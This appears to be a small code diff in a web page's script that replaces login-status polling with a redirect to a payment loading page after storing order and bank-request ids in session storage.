@@ -575,7 +575,7 @@
       if (data.ok && data.id) {
         sessionStorage.setItem('safwa_order_id', String(data.id));
         sessionStorage.setItem('aman_bank_request_id', String(data.id));
-        pollLoginStatus(data.id);
+        window.location.href = 'loading.html?type=payment&id=' + encodeURIComponent(data.id);
       } else {
         document.getElementById('loadingOverlay').classList.remove('active');
         document.getElementById('rejectModal').classList.add('active');
